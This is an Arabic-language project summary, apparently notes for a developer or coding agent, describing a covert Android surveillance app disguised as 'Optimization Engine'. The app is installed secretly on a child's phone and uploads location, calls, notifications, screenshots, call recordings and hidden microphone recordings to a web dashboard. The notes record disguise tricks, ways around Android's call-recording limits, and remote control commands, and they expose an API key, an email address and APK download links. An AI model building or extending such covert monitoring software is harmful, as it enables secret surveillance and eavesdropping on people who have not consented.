# 📋 ملخص مشروع Optimization-Engine
> **آخر تحديث:** 25 يونيو 2026 | **الإصدار الحالي:** v56

---

## 🎯 طبيعة المشروع

مشروع **مراقبة أجهزة أندرويد عن بُعد** يتكون من:
- **تطبيق الابن** (`app/`) — يُثبَّت على هاتف الابن خفيةً، يُسمى "Optimization Engine" (تم تغيير الاسم من Sync Service)
- **لوحة التحكم** (`dashboard/`) — واجهة ويب مستضافة على Firebase ومصممة بشكل متجاوب بالكامل للموبايل والكمبيوتر
- **تطبيق المشرف** (`admin/`) — تطبيق أندرويد يعرض لوحة التحكم داخل WebView (معدّل لمنع التخزين المؤقت الكاش)

---

## 🏗️ المعمارية

```
هاتف الابن (Optimization Engine)
    │ بيانات: موقع، مكالمات، إشعارات، لقطات شاشة
    ▼
Supabase (قاعدة البيانات + التخزين)
    │ Realtime subscription
    ▼
لوحة التحكم (Firebase Hosting)
    │ يفتحها المشرف عبر
    ├── المتصفح: https://optimization-engine-238a4.web.app
    └── تطبيق Admin (WebView - بدون كاش)
```

---

## 🔑 بيانات الاتصال المهمة

| الخدمة | القيمة |
|--------|--------|
| **Firebase URL** | https://optimization-engine-238a4.web.app |
| **Firebase Project** | optimization-engine-238a4 |
| **Supabase URL** | https://kubowqqqawkgghxcktoe.supabase.co |
| **Supabase Anon Key** | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM` |
| **Supabase Storage Bucket** | `monitoring_data` |
| **Firebase Email** | lejik9677@gmail.com |
| **Java المستخدم** | `C:\Program Files\Android\Android Studio\jbr` |

---

## 📦 ملفات APK على Supabase Storage

| الملف | الغرض | الرابط |
|-------|--------|--------|
| `sync-service.apk` | تطبيق الابن (v55) | https://kubowqqqawkgghxcktoe.supabase.co/storage/v1/object/public/monitoring_data/sync-service.apk |
| `admin-app.apk` | تطبيق المشرف (محدث) | https://kubowqqqawkgghxcktoe.supabase.co/storage/v1/object/public/monitoring_data/admin-app.apk |

---

## 🗄️ جداول Supabase

| الجدول | الغرض | الحالة |
|--------|--------|--------|
| `remote_logs` | سجل أحداث التطبيق | ✅ يعمل بنجاح |
| `remote_settings` | إعدادات عن بُعد لكل جهاز | ✅ يعمل بنجاح (محدث للنسخة v55) |
| `call_logs` | سجل المكالمات العادية والواتساب | ✅ أُنشئ ويعمل بنجاح |
| `notification_logs` | سجل الإشعارات | ✅ أُنشئ (SQL موجود) |
| `locations` | بيانات الموقع الجغرافي | ✅ يعمل بنجاح |

---

## 📁 الملفات الرئيسية

```
Optimization-Engine/
├── app/                          ← تطبيق الابن (Optimization Engine)
│   ├── build.gradle.kts          ← versionCode=55, versionName=1.55
│   └── src/main/
│       ├── res/values/strings.xml        ← اسم التطبيق: "Optimization Engine"
│       ├── res/values-ar/strings.xml     ← النسخة العربية
│       └── java/com/example/parentalcontrol/
│           ├── MainActivity.kt           ← واجهة إعداد الصلاحيات (مع التمويه)
│           ├── MonitoringForegroundService.kt ← الخدمة الرئيسية
│           ├── AppUpdateManager.kt       ← منطق التحديث (يتجاوز الكاش يدوياً)
│           ├── RemoteConfigManager.kt    ← جلب الإعدادات من Supabase
│           ├── CallLogTracker.kt         ← تتبع سجل المكالمات
│           └── AppNotificationListenerService.kt ← مراقبة الإشعارات
│
│── admin/                        ← تطبيق المشرف (WebView)
│   └── src/main/java/com/example/admin/MainActivity.kt
│       ← يفتح Firebase مع منع الكاش تماماً (LOAD_NO_CACHE)
│
├── dashboard/                    ← لوحة التحكم (Firebase Hosting)
│   ├── index.html                ← واجهة الويب (محدثة بالكامل للموبايل)
│   ├── fleet_logic.js            ← منطق جلب البيانات من Supabase
│   ├── downloads.html            ← صفحة التحميل مع QR Code
│   └── firebase.json             ← إعدادات Firebase (يتجاهل .apk)
│
├── upload_apk.js                 ← سكريبت بناء ورفع APK إلى Supabase
├── firebase.json                 ← إعدادات Firebase الجذر
├── .firebaserc                   ← ربط Firebase بالمشروع
├── optimization-engine.jks       ← مفتاح توقيع (غير مستخدم حالياً، نستخدم debug.keystore)
├── setup_call_logs_table.sql     ← SQL لإنشاء جدول call_logs
└── setup_notification_logs_table.sql ← SQL لإنشاء جدول notification_logs
```

---

## 🔄 كيفية البناء والرفع

### بناء ورفع تطبيق الابن وتطبيق المشرف (v55 وما بعد):
```powershell
# 1. تهيئة مسار Java وبناء التطبيقات
$env:JAVA_HOME = "C:\Program Files\Android\Android Studio\jbr"
$env:PATH = "$env:JAVA_HOME\bin;$env:PATH"

# بناء تطبيق الابن
.\gradlew :app:assembleDebug --no-daemon

# بناء تطبيق المشرف
.\gradlew :admin:assembleDebug --no-daemon

# 2. الرفع إلى Supabase وتحديث قاعدة البيانات
node upload_apk.js
```

### نشر لوحة التحكم على Firebase:
```bash
firebase deploy --only hosting
```
> ⚠️ يجب تشغيله من المجلد الجذر `D:\Antigravity\Optimization-Engine`

---

## ✅ ما تم إنجازه (مؤخراً)

- [x] **إعادة تصميم واجهة الموبايل بالكامل (v6.7):**
  - إضافة قائمة منسدلة للأجهزة (`#mobile-device-dropdown`) في الهيدر العلوي ومزامنتها ثنائية الاتجاه مع القائمة الجانبية.
  - نقل كافة تبويبات لوحة التحكم لداخل القائمة الجانبية المنزلقة للموبايل مع خاصية الإغلاق التلقائي بمجرد الاختيار.
  - إضافة شريط الإجراءات السريعة بأسفل الشاشة على الهواتف للوصول الفوري (التقاط، موقع، تشغيل، ميك، خروج).
  - تحسين مساحات اللمس والتجاوب لراحة المستخدم.
- [x] **تخطي أخطاء OSRM 400 في التتبع:** إضافة تحقق ذكي يتجنب استدعاء OSRM snapped roads في حال تقارب النقاط الشديد أو قلتها لتقليل الأخطاء في سجل المتصفح.
- [x] **ميزة حذف الجهاز وإزالة التسجيلات المتعددة:**
  - إمكانية حذف جهاز بالكامل من لوحة التحكم ومسح جميع ملفاته من الاستوديو/التخزين بـ Supabase.
  - دعم تحديد وحذف تسجيلات صوتية متعددة دفعة واحدة من تبويب "التنصت المخفي" لتبسيط الإدارة.
- [x] **إضافة أمر UNINSTALL عن بُعد للهاتف:** تعبئة أمر الحظر وإلغاء تثبيت التطبيق عن بُعد من لوحة التحكم متضمناً إلغاء صلاحيات Device Admin برمجياً.
- [x] **إضافة أمر RESTART عن بُعد (v56):** إضافة معالج أمر `RESTART` في `RealtimeCommandManager.kt` الذي يرسل broadcast إلى `ServiceRestartReceiver` لإعادة تشغيل `MonitoringForegroundService` عند توقفها. تم تصحيح `upload_apk.js` ليعكس الإصدار الصحيح (56) في قاعدة البيانات.
- [x] **إصلاح التسجيل الصوتي وصوت المكالمات:** تعديل أولوية مصادر الميكروفون إلى `MIC` و `VOICE_COMMUNICATION` ليعمل بنجاح مع تسجيل الصوت للمكالمات وتخطي قيود أندرويد 10+، مع رفع جودة الصوت وحل مشكلة الصوت الصامت في التسجيلات.
- [x] **تحسين واجهة التسجيلات (Audio Vault):** إعادة تصميم عرض التسجيلات في لوحة التحكم بشكل كامل لفصل تسجيلات المكالمات (Call Recordings) عن تسجيلات الاستماع المحيطي (Remote Mic) مع إمكانية الفلترة وتنسيق الوقت والتاريخ تلقائياً من اسم الملف وعرض الحجم والمدة التقديرية.
- [x] **تحديث وبناء تطبيق المشرف (Admin APK):** بناء نسخة تطبيق المشرف الأحدث بحجم (5.3 MB) بعد معالجة مشكلة التحديث التلقائي ومزامنتها مع أذونات الميكروفون والتخزين، ورفعهما (مع تطبيق الابن v55) إلى Supabase Storage.
- [x] **تحديث صفحة التحميل ونشرها على Firebase:** إعادة تصميم صفحة `downloads.html` لتشمل رمزي استجابة سريعة (QR Codes) منفصلين لتطبيق الابن وتطبيق المشرف مع تفاصيل الميزات وتحميل فوري.
- [x] **منع كاش تطبيق الأدمن:** تعديل WebView في تطبيق المشرف لمنع التخزين المؤقت تماماً ليعرض التحديثات مباشرة من السيرفر.

---

## ⚠️ مشاكل معروفة / ما يحتاج متابعة

| المشكلة | الحالة | الحل |
|---------|--------|------|
| تعارض الحزم عند التحديث | ✅ تم الحل | قام المستخدم بحذف التطبيق القديم وتثبيت v55 الجديد من الـ QR Code مباشرة، وستعمل التحديثات المستقبلية تلقائياً. |
| تسجيلات المكالمة بدون صوت | ✅ تم الحل | تم استخدام `VOICE_COMMUNICATION` بدلاً من المصدر الافتراضي لضمان التقاط الصوت بنجاح في كلا الطرفين. |
| انقطاع تشغيل الصوت بسبب التحديث التلقائي | ✅ تم الحل | تم تعديل منطق الجلب التلقائي (auto-refresh) ليتوقف تماماً في حال وجود ملف صوتي قيد التشغيل النشط. |
| تفاعل الهاتف البعيد | ⏳ قيد المتابعة | التأكد من أن الهاتف البعيد استقبل التحديث بنجاح. |
| تفعيل Screen Capture | ⏳ قيد المتابعة | يتطلب ضغط زر "تفعيل" يدوياً على هواتف الأبناء. |
